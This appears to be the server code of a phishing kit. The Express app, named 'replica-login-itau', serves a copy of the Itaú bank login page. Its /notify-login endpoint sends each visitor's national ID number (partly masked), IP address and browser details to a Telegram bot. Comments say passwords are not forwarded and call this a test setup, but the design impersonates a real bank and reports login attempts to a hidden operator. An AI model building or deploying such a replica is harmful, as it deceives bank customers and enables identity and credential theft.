const express = require('express');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 10000; // Render injects PORT

// Carpeta estática (confirmada: /public)
const STATIC_DIR = path.join(__dirname, 'public');

// Parse JSON bodies for /notify-login
app.use(express.json());

// --- Middleware: forzar Content-Type correcto para .css y .js ---
// Esto evita que ciertos proxies/hosts sirvan los archivos con un Content-Type
// incorrecto y provoca que el navegador muestre el código en lugar de aplicarlo.
app.use((req, res, next) => {
  try {
    if (req.path && req.path.endsWith('.css')) res.setHeader('Content-Type', 'text/css; charset=utf-8');
    if (req.path && req.path.endsWith('.js')) res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
  } catch (e) {
    console.warn('Error setting forced content-type header', e);
  }
  next();
});

// Logging de request + status al finalizar
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const ms = Date.now() - start;
    console.log(`${new Date().toISOString()} ${req.method} ${req.originalUrl} -> ${res.statusCode} ${ms}ms`);
  });
  next();
});

// Aviso si falta la carpeta estática (útil en deploys fallidos)
if (!fs.existsSync(STATIC_DIR)) {
  console.warn(`Advertencia: carpeta estática no encontrada: ${STATIC_DIR}`);
  console.warn('Asegúrate de que tu build copie los archivos estáticos en /public antes de desplegar.');
}

// Servir archivos estáticos (extensiones comunes y caché corta)
app.use(express.static(STATIC_DIR, { extensions: ['html', 'htm'], maxAge: '1d' }));

// Healthcheck para Render
app.get('/health', (req, res) => {
  res.json({ status: 'ok', app: 'replica-login-itau' });
});

// --- Utilidad: envío seguro a Telegram (no enviamos contraseñas) ---
function sendTelegramMessage(text) {
  return new Promise((resolve, reject) => {
    const token = process.env.TELEGRAM_BOT_TOKEN || process.env.TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID || process.env.ID;
    if (!token || !chatId) {
      const msg = 'Telegram token/chat_id no configurados en variables de entorno.';
      console.warn(msg);
      return resolve({ ok: false, error: msg });
    }

    const payload = JSON.stringify({ chat_id: chatId, text });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${token}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (d) => (body += d));
      res.on('end', () => {
        try {
          const json = JSON.parse(body || '{}');
          if (res.statusCode >= 200 && res.statusCode < 300 && json.ok) {
            resolve({ ok: true, body: json });
          } else {
            console.warn('Telegram API returned', res.statusCode, body);
            resolve({ ok: false, status: res.statusCode, body: json });
          }
        } catch (err) {
          console.warn('Error parsing Telegram response', err, body);
          resolve({ ok: false, error: 'invalid_response', body });
        }
      });
    });

    req.on('error', (e) => {
      console.error('Error enviando a Telegram:', e);
      reject(e);
    });
    req.write(payload);
    req.end();
  });
}

function maskRut(rut) {
  if (!rut) return 'N/D';
  const s = String(rut).trim();
  if (s.length <= 4) return '*'.repeat(s.length);
  const first = s.slice(0, 2);
  const last = s.slice(-2);
  return `${first}${'*'.repeat(Math.max(0, s.length - 4))}${last}`;
}

// Endpoint seguro para notificar intentos de ingreso
// Espera JSON: { rut: '...' }
app.post('/notify-login', async (req, res) => {
  try {
    const rutRaw = req.body && req.body.rut ? String(req.body.rut) : '';
    // NO aceptar ni reenviar contraseñas/clave
    const masked = maskRut(rutRaw);
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const ua = req.get('User-Agent') || 'unknown';
    const time = new Date().toISOString();

    const text = `🔐 Notificación de ingreso (entorno de pruebas)\nRUT: ${masked}\nIP: ${ip}\nUA: ${ua}\nHora: ${time}`;

    // send and await result
    const result = await sendTelegramMessage(text);

    console.log('Notificación tentativa a Telegram:', { rut: masked, ip, ua, time, telegramResult: result && result.ok });

    if (result && result.ok) {
      return res.json({ ok: true, message: 'Solicitud recibida correctamente' });
    }

    // Telegram failed or not configured
    return res.status(502).json({ ok: false, message: 'No se pudo notificar a Telegram', detail: result });
  } catch (err) {
    console.error('Error en /notify-login', err);
    res.status(500).json({ ok: false, message: 'Error interno' });
  }
});

// Fallback SPA: servir index.html para rutas no estáticas
app.get('*', (req, res) => {
  const indexPath = path.join(STATIC_DIR, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    console.error(`index.html no encontrado en ${indexPath} para la ruta ${req.originalUrl}`);
    res.status(404).send('Recurso no encontrado (index.html faltante en el servidor).');
  }
});

app.listen(PORT, () => {
  console.log(`Servidor Replica Itaú escuchando en puerto ${PORT}`);
});